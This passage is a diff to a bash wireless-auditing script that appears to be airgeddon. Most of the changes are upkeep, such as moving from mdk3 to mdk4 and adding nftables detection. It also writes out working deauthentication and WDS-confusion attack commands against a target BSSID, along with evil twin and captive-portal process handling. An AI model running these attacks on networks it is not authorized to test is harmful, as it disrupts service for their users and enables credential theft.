+			} > "${enterprise_returning_vars_file}"
+		}
+
 		#Kill Evil Twin Enterprise processes
 		function kill_enterprise_windows() {
 
@@ -8440,6 +8587,12 @@ function set_enterprise_control_script() {
 			echo -e "\t${log_reminder_msg}"
 			echo
 			echo -e "\t${done_msg}"
+
+			if [ "${enterprise_heredoc_mode}" = "smooth" ]; then
+				restore_interface
+				save_returning_vars_to_file
+			fi
+
 			exit 0
 		fi
 	EOF
@@ -8555,10 +8708,10 @@ function set_et_control_script() {
 				} >> "${et_captive_portal_logpath}"
 
 				sleep 2
-				kill "$(ps -C hostapd --no-headers -o pid)" &> /dev/null
-				kill "$(ps -C dhcpd --no-headers -o pid)" &> /dev/null
-				kill "$(ps -C aireplay-ng --no-headers -o pid)" &> /dev/null
-				kill "$(ps -C lighttpd --no-headers -o pid)" &> /dev/null
+				kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
+				kill "$(ps -C dhcpd --no-headers -o pid | tr -d ' ')" &> /dev/null
+				kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
+				kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
 				kill_et_windows
 				exit 0
 			}
@@ -8970,7 +9123,7 @@ function launch_webserver() {
 
 	debug_print
 
-	kill "$(ps -C lighttpd --no-headers -o pid)" &> /dev/null
+	kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
 	recalculate_windows_sizes
 	if [ ${captive_portal_mode} = "internet" ]; then
 		lighttpd_window_position=${g3_bottomright_window}
@@ -9108,7 +9261,7 @@ function kill_beef() {
 	local beef_pid
 	beef_pid="$(ps -C "${optional_tools_names[19]}" --no-headers -o pid  | tr -d ' ')"
 	if ! kill "${beef_pid}" &> /dev/null; then
-		kill "$(ps -C "beef" --no-headers -o pid  | tr -d ' ')" &> /dev/null
+		kill "$(ps -C "beef" --no-headers -o pid | tr -d ' ')" &> /dev/null
 	fi
 }
 
@@ -9445,11 +9598,11 @@ function kill_et_windows() {
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		kill_dos_pursuit_mode_processes
 		case ${et_dos_attack} in
-			"Mdk3"|"Wds Confusion")
-				kill "$(ps -C mdk3 --no-headers -o pid)" &> /dev/null
+			"Mdk4"|"Wds Confusion")
+				kill "$(ps -C mdk4 --no-headers -o pid | tr -d ' ')" &> /dev/null
 			;;
 			"Aireplay")
-				kill "$(ps -C aireplay-ng --no-headers -o pid)" &> /dev/null
+				kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
 			;;
 		esac
 	fi
@@ -9460,10 +9613,10 @@ function kill_et_windows() {
 
 	if [ -n "${enterprise_mode}" ]; then
 		kill ${enterprise_process_control_window} &> /dev/null
-		kill "$(ps -C hostapd-wpe --no-headers -o pid)" &> /dev/null
+		kill "$(ps -C hostapd-wpe --no-headers -o pid | tr -d ' ')" &> /dev/null
 	else
 		kill ${et_process_control_window} &> /dev/null
-		kill "$(ps -C hostapd --no-headers -o pid)" &> /dev/null
+		kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
 	fi
 }
 
@@ -9655,13 +9808,13 @@ function dos_attacks_menu() {
 	language_strings "${language}" 56
 	language_strings "${language}" 49
 	language_strings "${language}" 50 "separator"
-	language_strings "${language}" 51 mdk3_attack_dependencies[@]
+	language_strings "${language}" 51 mdk4_attack_dependencies[@]
 	language_strings "${language}" 52 aireplay_attack_dependencies[@]
-	language_strings "${language}" 53 mdk3_attack_dependencies[@]
+	language_strings "${language}" 53 mdk4_attack_dependencies[@]
 	language_strings "${language}" 54 "separator"
-	language_strings "${language}" 62 mdk3_attack_dependencies[@]
-	language_strings "${language}" 63 mdk3_attack_dependencies[@]
-	language_strings "${language}" 64 mdk3_attack_dependencies[@]
+	language_strings "${language}" 62 mdk4_attack_dependencies[@]
+	language_strings "${language}" 63 mdk4_attack_dependencies[@]
+	language_strings "${language}" 64 mdk4_attack_dependencies[@]
 	print_hint ${current_menu}
 
 	read -rp "> " dos_option
@@ -9685,7 +9838,7 @@ function dos_attacks_menu() {
 			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				mdk3_deauth_option
+				mdk4_deauth_option
 			fi
 		;;
 		6)
@@ -9744,11 +9897,11 @@ function capture_handshake_evil_twin() {
 	capture_handshake_window
 
 	case ${et_dos_attack} in
-		"Mdk3")
+		"Mdk4")
 			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 			echo "${bssid}" > "${tmpdir}bl.txt"
 			recalculate_windows_sizes
-			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk4 amok attack" -e mdk4 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
 			sleeptimeattack=12
 		;;
 		"Aireplay")
@@ -9759,7 +9912,7 @@ function capture_handshake_evil_twin() {
 		;;
 		"Wds Confusion")
 			recalculate_windows_sizes
-			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk4 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
 			sleeptimeattack=16
 		;;
 	esac
@@ -10195,9 +10348,9 @@ function attack_handshake_menu() {
 	print_simple_separator
 	language_strings "${language}" 147
 	print_simple_separator
-	language_strings "${language}" 139 mdk3_attack_dependencies[@]
+	language_strings "${language}" 139 mdk4_attack_dependencies[@]
 	language_strings "${language}" 140 aireplay_attack_dependencies[@]
-	language_strings "${language}" 141 mdk3_attack_dependencies[@]
+	language_strings "${language}" 141 mdk4_attack_dependencies[@]
 	print_hint ${current_menu}
 
 	read -rp "> " attack_handshake_option
@@ -10215,7 +10368,7 @@ function attack_handshake_menu() {
 				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 				echo "${bssid}" > "${tmpdir}bl.txt"
 				recalculate_windows_sizes
-				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk4 amok attack" -e mdk4 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
 				sleeptimeattack=12
 			fi
 		;;
@@ -10240,7 +10393,7 @@ function attack_handshake_menu() {
 				ask_timeout "capture_handshake"
 				capture_handshake_window
 				recalculate_windows_sizes
-				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
+				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk4 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
 				sleeptimeattack=16
 			fi
 		;;
@@ -11065,9 +11218,9 @@ function et_dos_menu() {
 		language_strings "${language}" 266
 	fi
 	print_simple_separator
-	language_strings "${language}" 139 mdk3_attack_dependencies[@]
+	language_strings "${language}" 139 mdk4_attack_dependencies[@]
 	language_strings "${language}" 140 aireplay_attack_dependencies[@]
-	language_strings "${language}" 141 mdk3_attack_dependencies[@]
+	language_strings "${language}" 141 mdk4_attack_dependencies[@]
 	print_hint ${current_menu}
 
 	read -rp "> " et_dos_option
@@ -11082,7 +11235,7 @@ function et_dos_menu() {
 			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				et_dos_attack="Mdk3"
+				et_dos_attack="Mdk4"
 
 				echo
 				language_strings "${language}" 509 "yellow"
@@ -11464,9 +11617,9 @@ function exit_script_option() {
 		action_on_exit_taken=1
 		language_strings "${language}" 297 "multiline"
 		clean_routing_rules
-		kill "$(ps -C dhcpd --no-headers -o pid)" &> /dev/null
-		kill "$(ps -C hostapd --no-headers -o pid)" &> /dev/null
-		kill "$(ps -C lighttpd --no-headers -o pid)" &> /dev/null
+		kill "$(ps -C dhcpd --no-headers -o pid | tr -d ' ')" &> /dev/null
+		kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
+		kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
 		kill_beef
 		time_loop
 		echo -e "${green_color} Ok\r${normal_color}"
@@ -11510,9 +11663,9 @@ function hardcore_exit() {
 
 	if [ ${routing_modified} -eq 1 ]; then
 		clean_routing_rules
-		kill "$(ps -C dhcpd --no-headers -o pid)" &> /dev/null
-		kill "$(ps -C hostapd --no-headers -o pid)" &> /dev/null
-		kill "$(ps -C lighttpd --no-headers -o pid)" &> /dev/null
+		kill "$(ps -C dhcpd --no-headers -o pid | tr -d ' ')" &> /dev/null
+		kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
+		kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
 		kill_beef
 	fi
 
@@ -11540,15 +11693,36 @@ function time_loop() {
 	done
 }
 
-#Fix iptables if needed
-function iptables_fix() {
+#Detect iptables/nftables
+function iptables_nftables_detection() {
 
 	debug_print
 
-	iptables_cmd="iptables"
+	if ! "${AIRGEDDON_FORCE_IPTABLES:-false}"; then
+		if hash nft  2> /dev/null; then
+			iptables_nftables=1
+		else
+			iptables_nftables=0
+		fi
+	else
+		if ! hash iptables 2> /dev/null && ! hash iptables-legacy 2> /dev/null; then
+			echo
+			language_strings "${language}" 615 "red"
+			exit_code=1
+			exit_script_option
+		else
+			iptables_nftables=0
+		fi
+	fi
 
-	if hash iptables-legacy 2> /dev/null; then
-		iptables_cmd="iptables-legacy"
+	if [ "${iptables_nftables}" -eq 0 ]; then
+		if hash iptables-legacy 2> /dev/null; then
+			iptables_cmd="iptables-legacy"
+		else
+			iptables_cmd="iptables"
+		fi
+	else
+		iptables_cmd="nft"
 	fi
 }
 
@@ -12308,7 +12482,7 @@ function check_compatibility() {
 		echo
 		language_strings "${language}" 111 "red"
 		echo
-		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+		if "${AIRGEDDON_SILENT_CHECKS:-true}"; then
 			language_strings "${language}" 581 "blue"
 			echo
 		fi
@@ -12665,6 +12839,7 @@ function env_vars_initialization() {
 									"AIRGEDDON_SILENT_CHECKS"
 									"AIRGEDDON_PRINT_HINTS"
 									"AIRGEDDON_5GHZ_ENABLED"
+									"AIRGEDDON_FORCE_IPTABLES"
 									"AIRGEDDON_DEVELOPMENT_MODE"
 									"AIRGEDDON_DEBUG_MODE"
 									)
@@ -12680,6 +12855,7 @@ function env_vars_initialization() {
 	boolean_options_env_vars["${ordered_options_env_vars[7]},default_value"]="true"
 	boolean_options_env_vars["${ordered_options_env_vars[8]},default_value"]="false"
 	boolean_options_env_vars["${ordered_options_env_vars[9]},default_value"]="false"
+	boolean_options_env_vars["${ordered_options_env_vars[10]},default_value"]="false"
 
 	boolean_options_env_vars["${ordered_options_env_vars[0]},rcfile_text"]="#Enabled true / Disabled false - Auto update feature (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[0]},'default_value']}"
 	boolean_options_env_vars["${ordered_options_env_vars[1]},rcfile_text"]="#Enabled true / Disabled false - Skip intro (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[1]},'default_value']}"
@@ -12689,8 +12865,9 @@ function env_vars_initialization() {
 	boolean_options_env_vars["${ordered_options_env_vars[5]},rcfile_text"]="#Enabled true / Disabled false - Dependencies, root and bash version checks are done silently (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[5]},'default_value']}"
 	boolean_options_env_vars["${ordered_options_env_vars[6]},rcfile_text"]="#Enabled true / Disabled false - Print help hints on menus - Default value ${boolean_options_env_vars[${ordered_options_env_vars[6]},'default_value']}"
 	boolean_options_env_vars["${ordered_options_env_vars[7]},rcfile_text"]="#Enabled true / Disabled false - Enable 5Ghz support (it has no effect if your cards are not 5Ghz compatible cards) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[7]},'default_value']}"
-	boolean_options_env_vars["${ordered_options_env_vars[8]},rcfile_text"]="#Enabled true / Disabled false - Development mode for faster development skipping intro and all initial checks - Default value ${boolean_options_env_vars[${ordered_options_env_vars[8]},'default_value']}"
-	boolean_options_env_vars["${ordered_options_env_vars[9]},rcfile_text"]="#Enabled true / Disabled false - Debug mode for development printing debug information - Default value ${boolean_options_env_vars[${ordered_options_env_vars[9]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[8]},rcfile_text"]="#Enabled true / Disabled false - Force to use iptables instead of nftables (it has no effect if nftables are not present) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[8]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[9]},rcfile_text"]="#Enabled true / Disabled false - Development mode for faster development skipping intro and all initial checks - Default value ${boolean_options_env_vars[${ordered_options_env_vars[9]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[10]},rcfile_text"]="#Enabled true / Disabled false - Debug mode for development printing debug information - Default value ${boolean_options_env_vars[${ordered_options_env_vars[10]},'default_value']}"
 
 	readarray -t ENV_VARS_ELEMENTS < <(printf %s\\n "${!boolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
 	ENV_BOOLEAN_VARS_ELEMENTS=("${ENV_VARS_ELEMENTS[@]}")
@@ -12927,7 +13104,7 @@ function main() {
 		check_update_tools
 	fi
 
-	iptables_fix
+	iptables_nftables_detection
 	print_configuration_vars_issues
 	initialize_extended_colorized_output
 	set_windows_sizes
@@ -13230,7 +13407,7 @@ function remove_warnings() {
 	echo "${clean_handshake_dependencies[@]}" > /dev/null 2>&1
 	echo "${aircrack_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${aireplay_attack_dependencies[@]}" > /dev/null 2>&1
-	echo "${mdk3_attack_dependencies[@]}" > /dev/null 2>&1
+	echo "${mdk4_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${hashcat_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_onlyap_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_sniffing_dependencies[@]}" > /dev/null 2>&1
